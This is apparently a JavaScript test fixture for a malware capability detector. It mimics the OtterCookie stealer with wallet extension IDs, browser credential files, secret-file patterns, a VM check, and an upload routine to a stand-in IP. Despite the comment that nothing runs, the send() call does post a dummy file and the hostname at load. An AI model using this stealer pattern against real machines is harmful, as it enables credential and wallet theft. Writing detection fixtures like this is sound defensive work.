// crumble test fixture. Not malware and not functional: no file is read,
// no key is captured, no screenshot is taken. It only carries the strings
// and module imports of the OtterCookie v4/v5 collection modules (upload
// endpoint, wallet extension ids, browser profile paths, keylogger and
// screenshot packages) so the capability detector has something to match.
const FormData = require("form-data");
const axios = require("axios");
const path = require("path");
const os = require("os");

const uploadUrl = "http://198.51.100.88:1224/uploads";
const ldbUrl = "http://ldb.example-cdn.invalid/cldbs";

const wallets = [
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase Wallet
];
const browserFiles = ["Login Data", "Local State", "Local Extension Settings"];
const patterns = [".env", "id_rsa", "*.kdbx", "wallet.dat"];

function hooks() {
  // module names only; nothing is loaded
  return ["node-global-key-listener", "screenshot-desktop"];
}

function vmCheck() {
  return ["wmic computersystem get model,manufacturer", "VMware", "VirtualBox", "QEMU"];
}

async function send(name, buf) {
  const form = new FormData();
  form.append("file", buf, { filename: name });
  form.append("hid", os.hostname());
  await axios.post(uploadUrl, form, { headers: form.getHeaders() });
}

send("fixture.txt", Buffer.from("fixture")).catch(() => {});
void [ldbUrl, wallets, browserFiles, patterns, hooks, vmCheck, path];
